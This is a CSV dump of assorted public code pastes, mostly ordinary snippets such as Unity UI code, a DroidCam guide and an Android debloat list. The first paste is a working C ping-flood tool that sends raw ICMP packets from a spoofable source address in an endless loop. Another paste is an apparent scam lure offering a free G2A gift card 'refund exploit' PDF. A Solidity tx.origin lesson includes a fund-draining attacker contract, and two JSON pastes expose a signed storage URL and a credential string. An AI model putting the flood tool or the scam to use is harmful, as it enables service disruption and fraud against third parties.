id,title,username,language,date,content
9NjF0fTH,PING Flood,opencard,C,Monday 15th of January 2024 11:59:30 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
typedef unsigned char u8;
typedef unsigned short int u16;
unsigned short in_cksum(unsigned short *ptr, int nbytes);
void help(const char *p);
int main(int argc, char **argv)
{
    if (argc < 3) 
    {
        printf(""KeyViewer PING FLOOD\nИспользование: %s <Отправитель> <Получатель> [размер сообщения]\n"", argv[0]);
        exit(0);
    }
    unsigned long daddr;
    unsigned long saddr;
    int payload_size = 0, sent, sent_size;
    saddr = inet_addr(argv[1]);
    daddr = inet_addr(argv[2]);
    if (argc > 3)
    {
        payload_size = atoi(argv[3]);
    }
    int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if (sockfd < 0) 
    {
        perror(""Не удалось создать сокет"");
        return (0);
    }
    int on = 1;
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
    {
        perror(""setsockopt"");
        return (0);
    }
    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
    {
        perror(""setsockopt"");
        return (0);
    }
    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    char *packet = (char *) malloc (packet_size);           
    if (!packet) 
    {
        perror(""out of memory"");
        close(sockfd);
        return (0);
    }
    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
    memset (packet, 0, packet_size);
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand ();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = saddr;
    ip->daddr = daddr;
      icmp->type = ICMP_ECHO;
    icmp->code = 0;
      icmp->un.echo.sequence = rand();
      icmp->un.echo.id = rand();
    icmp->checksum = 0;
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = daddr;
    memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
    puts(""Флуд..."");
    while (1)
    {
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
        icmp->checksum = 0;
        icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
        if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
        {
            perror(""Ошибка отправки\n"");
            break;
        }
        ++sent;
        printf(""%d Пакетов отправлено\r"", sent);
        fflush(stdout);    
        usleep(10000);
    }
    free(packet);
    close(sockfd);
    return (0);
}
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}"
cSZqUWrX,UI Dragging,Krythic,C#,Monday 15th of January 2024 11:48:04 PM CDT,"using UnityEngine;
using UnityEngine.EventSystems;

public class DraggableControl : MonoBehaviour,
    IPointerDownHandler, IPointerUpHandler, IDragHandler
{
    public GameObject parent;
    public Canvas canvas;
    private bool _isDragging;
    private Vector3 _offset;

    // Start is called before the first frame update
    void Start()
    {

    }

    public void OnPointerDown(PointerEventData eventData)
    {
        _isDragging = true;
        _offset = eventData.position - new Vector2(parent.transform.position.x, parent.transform.position.y);
    }

    public void OnPointerUp(PointerEventData eventData)
    {
        _isDragging = false;
    }

    public void OnDrag(PointerEventData eventData)
    {
        if (_isDragging)
        {
            Vector3 position = new Vector3(Input.mousePosition.x, Input.mousePosition.y, 0f) - _offset;
            parent.transform.position = position;
            /**
             * TODO Tomorrow
             * Move the two getcomponent calls up to the OnPointerDown handler, so we only call it once while
             * the playeris dragging the ui element, instead of every frame that it is dragging.
             */
            ClampToWindow(
                position,
                parent.GetComponent<RectTransform>(),
                canvas.GetComponent<RectTransform>());
        }
    }

    private void ClampToWindow(Vector3 mousePosition, RectTransform parentRect, RectTransform canvasRect)
    {
        parentRect.transform.position = mousePosition;
        Vector3 pos = parentRect.localPosition;
        Vector3 minPosition = canvasRect.rect.min - parentRect.rect.min;
        Vector3 maxPosition = canvasRect.rect.max - parentRect.rect.max;
        pos.x = Mathf.Clamp(parentRect.localPosition.x, minPosition.x, maxPosition.x);
        pos.y = Mathf.Clamp(parentRect.localPosition.y, minPosition.y, maxPosition.y);
        parentRect.localPosition = pos;
    }
}
"
btRAAVVY,Untitled,kwest87,C#,Monday 15th of January 2024 11:17:33 PM CDT,"using System;

namespace ConsoleApp27
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int[] numbers = { 1, 2, 3, 4, 5 };
            int temporaryNumber;
            int shift;

            Console.WriteLine(""Сколь раз сдвинуть массив влево : "");
            shift = Convert.ToInt32(Console.ReadLine());
            shift %= numbers.Length;

            for (int j = 0; j < shift; shift--)
            {
                temporaryNumber = numbers[0];

                for (int i = 0; i < numbers.Length - 1; i++)
                {
                    numbers[i] = numbers[i + 1];
                }

                numbers[numbers.Length - 1] = temporaryNumber;
            }

            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }
        }
    }
}"
59ezTp3C,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Monday 15th of January 2024 11:05:39 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_783907.pdf
 
Working as of
16 January 2024"
NX6EceZX,Using Droidcam on Linux with V4L2,chadjoan,Bash,Monday 15th of January 2024 11:00:21 PM CDT,"# Possibly optional steps that improve resolution.
# These must be done as `root`.
# Source: https://www.dev47apps.com/droidcam/linux/
rmmod v4l2loopback-dc
insmod /lib/modules/`uname -r`/video/v4l2loopback-dc.ko width=1920 height=1080

# Open DroidCam(X) on Android device. Start it up. Get IP address and port.
# In this example, the IP address is 192.168.1.39 and the port is 4747.

# Put this in one shell to create a /dev/videoN node that other programs can connect to.
# (I did this as `root`, but I'm not sure if `root` is needed.)
droidcam-cli -a -v 192.168.1.39 4747
#```
#Client v2.0.0
#Video: /dev/video0
#Audio: hw:3,1,0
#```

# Alternatively, if the device has ADB debugging over USB enabled
# in its developer options, then droidcam-cli can connect this way
# over a USB3.0 wire:
droidcam-cli -a -v adb 4747

# This connection seems to have MUCH better bandwidth/framerate!
#
# If connecting from a new computer, the phone might get a prompt
# asking whether the computer should be trusted. This prompt must
# be answered affirmatively before the above `adb` mode will work.
# After answering the prompt, it may also be necessary to restart
# the DroidCam(X) app on the phone/device, and possibly also
# necessary to restart `droidcam-cli` with the same command above.
# If all is good, it will give the same output as the IP version.

# It should now be possible to use the ""webcam"" from other programs, and from web apps like Discord.
# (This should be done as the user in the desktop environment, NOT as root.)
# To test functionality manual, `mpv` can be used like so:
mpv av://v4l2:/dev/video0 --profile=low-latency --untimed
#```
# (+) Video --vid=1 (rawvideo 1920x1080 30.000fps)
#VO: [gpu] 1920x1080 yuv420p
#V: 02:08:20 / 02:08:20 (100%)
#```
# NOTE that the `/dev/video0` in this command must match the ""Video:"" field from droidcam-cli.
# It just happened to be `/dev/video0` in this example, but it could be any `/dev/videoN` node.
"
QBva7r4d,for xda,tdbone1,Bash,Monday 15th of January 2024 09:53:13 PM CDT,"# Preset created in ADB AppControl 1.8.3.1
# Total applications: 100
# 2024-01-15_21:51:56
# Samsung SM-G998B Uninstalled applications
com.android.apps.tag
com.android.bips
com.android.bookmarkprovider
com.android.cts.priv.ctsshim
com.android.dreams.basic
com.android.dreams.phototable
com.android.dynsystem
com.android.egg
com.android.hotwordenrollment.okgoogle
com.android.hotwordenrollment.xgoogle
com.android.managedprovisioning
com.android.printspooler
com.android.providers.partnerbookmarks
com.android.stk
com.android.stk2
com.android.traceur
com.android.vending
com.android.wallpaper.livepicker
com.diotek.sec.lookup.dictionary
com.google.android.apps.restore
com.google.android.apps.turbo
com.google.android.cellbroadcastreceiver
com.google.android.configupdater
com.google.android.feedback
com.google.android.gms
com.google.android.gms.location.history
com.google.android.googlequicksearchbox
com.google.android.onetimeinitializer
com.google.android.partnersetup
com.google.android.printservice.recommendation
com.google.android.projection.gearhead
com.google.android.setupwizard
com.google.android.syncadapters.calendar
com.google.android.tts
com.google.audio.hearing.visualization.accessibility.scribe
com.monotype.android.font.foundation
com.osp.app.signin
com.samsung.android.accessibility.talkback
com.samsung.android.allshare.service.mediashare
com.samsung.android.app.camera.sticker.facearavatar.preload
com.samsung.android.app.clipboardedge
com.samsung.android.app.cocktailbarservice
com.samsung.android.app.omcagent
com.samsung.android.app.reminder
com.samsung.android.app.routines
com.samsung.android.app.settings.bixby
com.samsung.android.app.sharelive
com.samsung.android.app.taskedge
com.samsung.android.app.updatecenter
com.samsung.android.app.watchmanagerstub
com.samsung.android.aware.service
com.samsung.android.bbc.bbcagent
com.samsung.android.beaconmanager
com.samsung.android.bixby.agent
com.samsung.android.bixbyvision.framework
com.samsung.android.calendar
com.samsung.android.da.daagent
com.samsung.android.dynamiclock
com.samsung.android.easysetup
com.samsung.android.fmm
com.samsung.android.forest
com.samsung.android.game.gamehome
com.samsung.android.game.gametools
com.samsung.android.gru
com.samsung.android.ipsgeofence
com.samsung.android.mdx
com.samsung.android.mobileservice
com.samsung.android.net.wifi.wifiguider
com.samsung.android.networkstack.tethering.overlay
com.samsung.android.peripheral.framework
com.samsung.android.rubin.app
com.samsung.android.scloud
com.samsung.android.sdm.config
com.samsung.android.service.peoplestripe
com.samsung.android.service.stplatform
com.samsung.android.smartmirroring
com.samsung.android.stickercenter
com.samsung.android.svoiceime
com.samsung.android.visionintelligence
com.samsung.app.newtrim
com.samsung.cmfa.AuthTouch
com.samsung.SMT
com.samsung.storyservice
com.sec.android.app.chromecustomizations
com.sec.android.app.clockpackage
com.sec.android.app.desktoplauncher
com.sec.android.app.dexonpc
com.sec.android.app.magnifier
com.sec.android.app.safetyassurance
com.sec.android.app.samsungapps
com.sec.android.app.SecSetupWizard
com.sec.android.app.setupwizardlegalprovider
com.sec.android.autodoodle.service
com.sec.android.daemonapp
com.sec.android.desktopmode.uiservice
com.sec.android.easyMover.Agent
com.sec.android.soagent
com.sec.enterprise.knox.cloudmdm.smdms
com.sec.location.nsflp2
com.sec.spp.push
"
9YEL7Xfw,Linux. Unzip. Test integrity of ZIP file,sytchenko,Bash,Monday 15th of January 2024 09:36:51 PM CDT,unzip -t archive.zip
j1jsDQrq,Smart Contract Vulnerability - Authorization Through tx.origin,FlyFar,Email,Monday 15th of January 2024 09:06:06 PM CDT,"Authorization Through tx.origin
tx.origin is a global variable in Solidity which returns the address that sent a transaction. It's important that you never use tx.origin for authorization since another contract can use a fallback function to call your contract and gain authorization since the authorized address is stored in tx.origin. Consider this example:

pragma solidity >=0.5.0 <0.7.0;

// THIS CONTRACT CONTAINS A BUG - DO NOT USE
contract TxUserWallet {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function transferTo(address payable dest, uint amount) public {
        require(tx.origin == owner);
        dest.transfer(amount);
    }
}

Here we can see that the TxUserWallet contract authorizes the transferTo() function with tx.origin.

pragma solidity >=0.5.0 <0.7.0;

interface TxUserWallet {
    function transferTo(address payable dest, uint amount) external;
}

contract TxAttackWallet {
    address payable owner;

    constructor() public {
        owner = msg.sender;
    }

    function() external {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}

Now if someone were to trick you into sending ether to the TxAttackWallet contract address, they can steal your funds by checking tx.origin to find the address that sent the transaction.

To prevent this kind of attack, use msg.sender for authorization.

Examples from: https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin

Sources
https://swcregistry.io/docs/SWC-115
https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin
https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/
https://github.com/sigp/solidity-security-blog#tx-origin"
qkdSEmc0,Untitled,BayangBec,JSON,Monday 15th of January 2024 08:53:46 PM CDT,"[
  {
    catalog_id: '08186bc0-07fb-4867-a163-67c98dec43e3',
    catalog_url: 'https://dev-storage-mccp.mocogawe.com/original/publication/book/file/5fa35fc63f30a67fd2dfdeeffabb58747fa416faff6b7b80720c3f6e41053984.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=minio%2F20231215%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231215T034555Z&X-Amz-Expires=7200&X-Amz-SignedHeaders=host&X-Amz-Signature=b64f413ff65512a2d20f8a9b0f46573b2cf0f31a5f7b328302f658e1d1cde2a8'
  }
]"
Fuf9tYpt,Untitled,BayangBec,JSON,Monday 15th of January 2024 08:47:50 PM CDT,"{
  ""data"": [
    {
      ""catalog_id"": ""841aed8d-1c43-4393-9b6a-8fcb4eaaed25"",
      ""created_at"": ""2024-01-16T01:58:10.698Z"",
      ""epustaka_id"": ""bf61f006-e90a-4c36-a6c8-d5b566a2a088"",
      ""epustaka_catalog_qty"": 2
    }
  ],
  ""app_id"": ""6453b42c-a3f6-434d-ae6f-1071f148f24e"",
  ""config"": {
    ""url"": ""https://dev-api-agent-manager.mocogawe.com/agent-manager"",
    ""header"": {
      ""headers"": {
        ""Accept"": ""application/json"",
        ""Content-Type"": ""application/json"",
        ""Access-Control-Allow-Origin"": true
      }
    },
    ""method"": ""post"",
    ""endpoint"": ""activation/content""
  },
  ""credential"": ""454f6a64324f5958534a4a445233626f2f79754834356b456f6b5538755036346d357a4a6d65526c6b356a48466162656d4f35794250623458364c6c375956612b326e2f674f6169347256724a61324f5a66437441413d3d""
}"
rpevXg59,Loop breaking II.,alansam,C++,Monday 15th of January 2024 08:29:46 PM CDT,"/*
 * Trying to refactor someone else's code from codingame website.
 * I am trying to replace a massive if else block with a switch statement.
 * I cannot figure out why my statement is not equivalent to there's.
 * Sorry for the long post. My Git seems broken lately.
 * Can someone explain please?
 */

#include <iostream>
#include <iomanip>
#include <string>
#include <vector>
#include <algorithm>

#define SWITCH_

namespace js {
static constexpr auto L { 8 };
static constexpr auto C { 8 };
static auto N { 0 };

static
std::vector<std::string> rows = {
  {""########""},
  {""# @    #""},
  {""#     X#""},
  {""# XXX  #""},
  {""#   XX #""},
  {""#   XX #""},
  {""#     $#""},
  {""########""}
};

std::pair<int, int> move(std::string s, std::pair<int, int> lpos) {
  if      (s == ""SOUTH"") { lpos.second++; }
  else if (s == ""WEST"")  { lpos.first--; }
  else if (s == ""EAST"")  { lpos.first++; }
  else if (s == ""NORTH"") { lpos.second--; }
  return lpos;
}

bool isPassable(std::string dir, std::pair<int, int> pos, bool dis) {
  std::pair<int, int> npos = move(dir, pos);
  if (npos.first < 0 || npos.second < 0 || npos.first >= C || npos.second >= L) {
    return false;
  }
  auto c = rows[npos.second][npos.first];
  return !(c == '#' || (c == 'X' && !dis));
}

} /* namespace js */

int main() {
  std::pair<int, int> pos;
  std::vector<std::string> directions = { ""SOUTH"", ""EAST"", ""NORTH"", ""WEST"" };
  std::vector<std::pair<int, int>> tl;
  std::string out = """";
  auto BM { false };
  js::rows.resize(js::L);
  for (auto i = 0ul; i < js::L; i++) {
    auto f = js::rows[i].find(""@"");
    if (f != std::string::npos) {
      pos = std::make_pair(f, i);
    }
    for (auto j = 0ul; j < js::rows[i].size(); j++) {
      if (js::rows[i][j] == 'T') {
        tl.emplace_back(j, i);
      }
    }
  }

  std::string dir = ""SOUTH"";
  /* loop forever */ while (true) {
    if (!js::isPassable(dir, pos, BM)) {
      for (auto const & ds : directions) {
        if (js::isPassable(ds, pos, BM)) {
          dir = ds;
          break;
        }
      }
    }

    out += dir + ""\n"";
    pos = js::move(dir, pos);

    char block = js::rows[pos.second][pos.first];
#ifdef SWITCH_
    //My Way...Seems to loop infinitely.
    auto complete { false }; /* flag for loop termination - initially false */
    switch (block) {
      case 'X':
        js::rows[pos.second].replace(pos.first, 1, "" "");
        break;

      case '$':
        /* loop should terminate - set flag */
 		    complete = true;
        break;

      default:
        for (auto const & ds : directions) {
          if (ds[0] == block) {
            dir = ds;
            break;
          }
        }
    }
    if (complete) { /* terminate forever loop */ break; }
#else
    //Their Way...Works
    if (block == 'X') {
      rows[pos.second].replace(pos.first, 1, "" "");
    }
    else if (block == '$') { 
      break;
    }
    else {
      for (auto const & ds : directions) {
        if (ds[0] == block) {
          dir = ds;
          /* terminate forever loop */  break;
        }
      }
    }
#endif

    // Loop check
    js::N++;
    if (js::N > js::C * js::L) {
      out = ""LOOP\n"";
      break;
    }
  }
  std::cout << out;
}
"
1tPYjF6m,celltype.lua,snowgum,Lua,Monday 15th of January 2024 08:15:24 PM CDT,"#!/usr/bin/lua

modem = arg[1]
numb = arg[2]
echo = 0

datalist = {}
celllist = {}

datalist[1] = ""320u""
celllist[1] = 2
datalist[2] = ""330u""
celllist[2] = 2
datalist[3] = ""e3276""
celllist[3] = 3
datalist[4] = ""e398""
celllist[4] = 3
datalist[5] = ""e389""
celllist[5] = 3
datalist[6] = ""e392""
celllist[6] = 3
datalist[7] = ""e397""
celllist[7] = 3
datalist[8] = ""e8278""
celllist[8] = 3
datalist[9] = ""mf820""
celllist[9] = 3
datalist[10] = ""mf821""
celllist[10] = 3
datalist[11] = ""k5005""
celllist[11] = 3
datalist[12] = ""k5007""
celllist[12] = 3
datalist[13] = ""l800""
celllist[13] = 3
datalist[14] = ""e398""
celllist[14] = 3
datalist[15] = ""mf880""
celllist[15] = 3
datalist[16] = ""e3272""
celllist[16] = 3
datalist[17] = ""e3372""
celllist[17] = 3
datalist[18] = ""lte""
celllist[18] = 3
datalist[19] = ""340u""
celllist[19] = 2
datalist[20] = ""mf91d""
celllist[20] = 3
datalist[21] = ""mf825a""
celllist[21] = 3
datalist[22] = ""mf826""
celllist[22] = 3
datalist[23] = ""313u""
celllist[23] = 2
datalist[24] = ""341u""
celllist[24] = 2
datalist[25] = ""em74""
celllist[25] = 2
datalist[26] = ""mc74""
celllist[26] = 2
datalist[27] = ""em75""
celllist[27] = 2
datalist[28] = ""ec2""
celllist[28] = 3
datalist[29] = ""em06""
celllist[29] = 2
datalist[30] = ""ep06""
celllist[30] = 2
datalist[31] = ""slm750""
celllist[31] = 3
datalist[32] = ""bg96""
celllist[32] = 3
datalist[33] = ""em12""
celllist[33] = 2
datalist[34] = ""em20""
celllist[34] = 2
datalist[35] = ""rm5""
celllist[35] = 4
datalist[36] = ""l850""
celllist[36] = 2
datalist[37] = ""l860""
celllist[37] = 2
datalist[38] = ""fm15""
celllist[38] = 4
datalist[39] = ""em18""
celllist[39] = 2
datalist[40] = ""4105""
celllist[40] = 2
datalist[41] = ""em919""
celllist[41] = 4
datalist[42] = ""em16""
celllist[42] = 2
datalist[43] = ""sim820""
celllist[43] = 4
datalist[44] = ""mc73""
celllist[44] = 2
datalist[45] = ""eg25""
celllist[45] = 2
datalist[46] = ""srm8""
celllist[46] = 4
datalist[47] = ""4087""
celllist[47] = 3
datalist[48] = ""rg5""
celllist[48] = 4
datalist[49] = ""eg12""
celllist[49] = 2
datalist[50] = ""eg18""
celllist[50] = 2
datalist[51] = ""megafon""
celllist[51] = 2
datalist[52] = ""ln9""
celllist[52] = 2
datalist[53] = ""fm190""
celllist[53] = 4

printf = function(s,...)
	if echo == 0 then
		io.write(s:format(...))
	else
		ss = s:format(...)
		os.execute(""/usr/lib/rooter/logprint.sh "" .. ss)
	end
end

found = 3
index = 1
line = datalist[index]
data = string.lower(modem)

while line ~= nil do
	s, e = string.find(data, line)
	if s ~= nil then
		found = celllist[index]
		break
	end
	index = index + 1
	line = datalist[index]
end

file = io.open(""/tmp/celltype"" .. numb, ""w"")
cell = string.format(""%s%s%s%s"", ""CELL"", ""=\"""", found, ""\"""")
file:write(cell.. ""\n"")
file:close()
"
FiK0u1P5,Untitled,markov2019,Lua,Monday 15th of January 2024 07:57:52 PM CDT,"local component = require(""component"")
local me = component.me_interface

local items = {
    {id = ""appliedenergistics2:item.ItemMultiMaterial"", dmg = 22, size = 1000}
}

local function preCraft(item, dmg, amount, me)
    local meCraftebles = me.getCraftables()
    for k = 1, #meCraftebles do
        local currentItem = meCraftebles[k].getItemStack()
        if currentItem.name == item and currentItem.damage == dmg then
            local isCrafting = meCraftebles[k].request(amount)

            print(""Crafting running. Request size "" .. tostring(amount) .. ""."")

            while 1 do
                if isCrafting.isCanceled() == true then
                    print(""Request error."")
                    return false
                end
                if isCrafting.isDone() == true then
                  print(""\t Exporting..."")
                  print(""Craft done!"")
                  os.sleep(15)
                  return true
                else
                  print(""\tExporting error: "" .. er)
                  return false
                end
                os.sleep(0)
            end
        end
    end
end

local function findInNetwork(main)
    while 1 do
        for i = 1, #items do
            local fingerprint = {id = items[i].id, dmg = items[i].dmg}
            print(""Looking for "" .. items[i].id)
            local _, value = pcall(main.getItemDetail, fingerprint)
            if value ~= nil then
                local itemDetails = value.basic()

                print(""Found "" .. itemDetails.display_name .. "". Checking size..."")
                if itemDetails.qty < items[i].size then
                    print(""Need to craft "" .. tostring(items[i].size - itemDetails.qty) .. ""!"")
                    preCraft(items[i].id, items[i].dmg, (items[i].size - itemDetails.qty), main)
                else
                    print(""There are "" .. tostring(itemDetails.qty) .. "" in system, no need to craft it!"")
                end
            else
                print(""There is no "" .. items[i].id .. "". Starting test craft"")
                preCraft(items[i].id, items[i].dmg, 1, main)
            end
            print(""-------------------------------------------------------------------------------"")
        end
    end
    os.sleep(0)
end

ok, err = pcall(findInNetwork)
print(ok, err)
--computer.shutdown(true)
"
y41vqXJn,Nuance Module,djvj,Autohotkey,Monday 15th of January 2024 07:14:48 PM CDT,"MEmu := ""Nuance""
MEmuV := ""v0.51""
MURL := [""http://www.nuon-dome.com/""]
MAuthor := [""djvj""]
MVersion := ""2.0""
MCRC := """"
iCRC := """"
MID := """"
MSystem := [""VM Labs NUON""]
;----------------------------------------------------------------------------
; Notes:
; Emu author died in 2007, so there will be no further updates to this emu
; Only CLI param supported is the config file for Nuance to use on load
; Virtual Drive must be used to load TruRip iso dumps of NUON games. The emu does not support reading from the iso directly.
; Only iso dumps are supported.
;----------------------------------------------------------------------------
StartModule()
BezelGUI()
FadeInStart()

nuanceVideoWindow := ""Nuance Video Display ahk_class GLWindow""
nuanceCPWindow := ""Nuance Control Panel ahk_class #32770""
nuanceStatusWindow := ""Nuance Status Window ahk_class #32770""
nuanceOpenWindow := dialogOpen . "" ahk_class #32770""

settingsFile := modulePath . ""\"" . moduleName . "".ini""
customNuanceConfig := IniReadCheck(settingsFile, romName, ""Custom_Config"",,,1)

hideEmuObj := Object(nuanceOpenWindow,0,nuanceCPWindow,0,nuanceStatusWindow,0,nuanceVideoWindow,1)	; Hide_Emu will hide these windows. 0 = will never unhide, 1 = will unhide later
7z(romPath, romName, romExtension, 7zExtractPath)

If (vdEnabled = ""false"" && romExtension = "".iso"")
	ScriptError(""Virtual Drive support is disabled and is required to run this game. Please enable Virtual Drive first and try again."")
Else
	VirtualDrive(""get"")	; populates the vdDriveLetter variable with the drive letter to your scsi or dt virtual drive

BezelStart(""FixResMode"")

bizFullscreen := If fullscreen = ""true"" ? "" --fullscreen"" : """"
defaultNuanceConfig := emuPath . ""\nuance.cfg""
nuanceConfigFile := CheckFile(If customConfig ? customConfig : defaultNuanceConfig)

HideEmuStart()
If (vdEnabled = ""true"")
{	VirtualDrive(""mount"",romPath . ""\"" . romName . romExtension)
	usedVD := 1
}

Run(executable . "" """""" . nuanceConfigFile . """""""", emuPath)

WinWait(nuanceStatusWindow)
WinWaitActive(nuanceStatusWindow)

ControlClick, button4, %nuanceCPWindow%	; Load File
WinWaitActive(nuanceOpenWindow)	; for some reason windows sometimes thinks Nuance loaded the open window when it did not, this helps prevent that.
OpenROM(nuanceOpenWindow, vdDriveLetter . "":\NUON\nuon.run"")
WinWaitActive(nuanceCPWindow)
ControlClick, button2, %nuanceCPWindow%	; Run
WinActivate, %nuanceVideoWindow%

BezelDraw()
HideEmuEnd()
FadeInExit()
Process(""WaitClose"", executable)

If usedVD
	VirtualDrive(""unmount"")

7zCleanUp()
BezelExit()
FadeOutExit()
ExitModule()


CloseProcess:
	FadeOutStart()
	WinClose(nuanceCPWindow)
Return
"
4S8R7hne,Rapid Right Click Macro in Python,101prairiedogs,Python,Monday 15th of January 2024 07:08:32 PM CDT,"'''
Pressing and holding the X2 button rapidly clicks the right mouse button and the middle click.
This macro was tested to work on a public Minecraft server, but could be caught by anti-cheating software.
If your mouse lacks an x2 button, then rebinding to a different key is trivial.

Changing the line:
'if button == mouse.Button.x2:' to any mouse button of your choice will work just as well.
'''

from pynput import mouse
from pynput.mouse import Button, Controller
from multiprocessing import Process, Event
import sys

def listener(kill_event, flag_event):

	def on_click(x, y, button, pressed):
		print(button, pressed)
		if button == mouse.Button.x2:
			if pressed:
				flag_event.set()
			else:
				flag_event.clear()
		if button == mouse.Button.x1:
			# Stop the macro
			print('Terminating...')
			kill_event.set()
			return False

	with mouse.Listener(on_click=on_click) as listener:
		listener.join()

def task(kill_event, flag_event):
	controller = Controller()
	print('Listening...')
	while True:
		if kill_event.is_set():
			sys.exit(0)
		if flag_event.is_set():
			controller.click(Button.right)
			controller.click(Button.middle)

if __name__ == '__main__':
	kill_event = Event()
	flag_event = Event()

	listener_thread = Process(target=listener, args=(kill_event, flag_event))
	task_thread = Process(target=task, args=(kill_event, flag_event))

	listener_thread.start()
	task_thread.start()

	listener_thread.join()
	task_thread.join()
"
fAwtudwx,Raid System Event Farm,VANPER,Java,Monday 15th of January 2024 06:44:34 PM CDT,"Index: java/net/sf/l2j/gameserver/dev/systemFarm/SystemFarmManager.java
===================================================================
--- java/net/sf/l2j/gameserver/dev/systemFarm/SystemFarmManager.java	(BAN - L2JDEV www.l2jdev.com.br)
+++ java/net/sf/l2j/gameserver/dev/systemFarm/SystemFarmManager.java	


+	package net.sf.l2j.gameserver.dev.systemFarm;
+	
+	import java.io.File;
+	import java.io.IOException;
+	import java.text.SimpleDateFormat;
+	import java.util.ArrayList;
+	import java.util.Calendar;
+	
+	import net.sf.l2j.commons.concurrent.ThreadPool;
+	import net.sf.l2j.commons.config.ExProperties;
+	import net.sf.l2j.commons.logging.CLogger;
+	
+	import net.sf.l2j.Config;
+	import net.sf.l2j.gameserver.data.xml.NpcData;
+	import net.sf.l2j.gameserver.model.World;
+	import net.sf.l2j.gameserver.model.actor.Npc;
+	import net.sf.l2j.gameserver.model.actor.Player;
+	import net.sf.l2j.gameserver.model.actor.template.NpcTemplate;
+	import net.sf.l2j.gameserver.model.item.instance.ItemInstance;
+	import net.sf.l2j.gameserver.model.spawn.Spawn;
+	import net.sf.l2j.gameserver.network.SystemMessageId;
+	import net.sf.l2j.gameserver.network.serverpackets.ItemList;
+	import net.sf.l2j.gameserver.network.serverpackets.SystemMessage;
+	
+	/**
+	 * @author BAN - L2JDEV
+	 */
+	public class SystemFarmManager
+	{
+		private static final CLogger LOGGER = new CLogger(SystemFarmManager.class.getName());
+		private Calendar NextEvent;
+		
+		public static boolean SYSTEMFARM_EVENT_ENABLE;
+		public static String[] SYSTEMFARM_EVENT_BY_TIME_OF_DAY;
+		public int SYSTEMFARM_TIME;
+		public int SYSTEMFARM_NPC_ID_TYPE_ONE;
+		public int SYSTEMFARM_NPC_ID_TYPE_TWO;
+		public int itemId;
+		public int count;
+		
+		public static int[] SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES = new int[3];
+		
+		public static int[] SYSTEM_EVENT_NPCID_TYPE_TWO_COORDINATES = new int[3];
+		
+		public static final String SYSTEM_FARM_FILE = ""config/SystemFarmManager.properties"";
+		
+		public ArrayList<Spawn> MonsterEvent = new ArrayList<>();
+		
+		public boolean _starting;
+		public boolean _aborted;
+		
+		public SystemFarmManager()
+		{
+			try
+			{
+				ExProperties l2jdev = load(SYSTEM_FARM_FILE);
+				SYSTEMFARM_EVENT_ENABLE = l2jdev.getProperty(""SystemFarmEventEnable"", false);
+				
+				SYSTEMFARM_EVENT_BY_TIME_OF_DAY = l2jdev.getProperty(""EventTimeOfDay"", ""20:00"").split("","");
+				SYSTEMFARM_TIME = l2jdev.getProperty(""EventTime"", 60);
+				
+				itemId = l2jdev.getProperty(""itemId"", 57);
+				count = l2jdev.getProperty(""count"", 100);
+				
+				SYSTEMFARM_NPC_ID_TYPE_ONE = l2jdev.getProperty(""RaidSpawnNpcIdTypeOne"", 300);
+				SYSTEMFARM_NPC_ID_TYPE_ONE = l2jdev.getProperty(""RaidSpawnNpcIdTypeOne"", 300);
+				
+				String[] propertySplit = l2jdev.getProperty(""RaidNpcCoordinatesOne"", ""0,0,0"").split("","");
+				if (propertySplit.length < 3)
+				{
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[0] = 83456;
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[1] = 148611;
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[2] = -3408;
+				}
+				else
+				{
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[0] = Integer.parseInt(propertySplit[0]);
+					SYSTEM_EVENT_NPCID_TYPE_ONE_COORDINATES[1] = Integer.parseInt(propertySplit[1]);
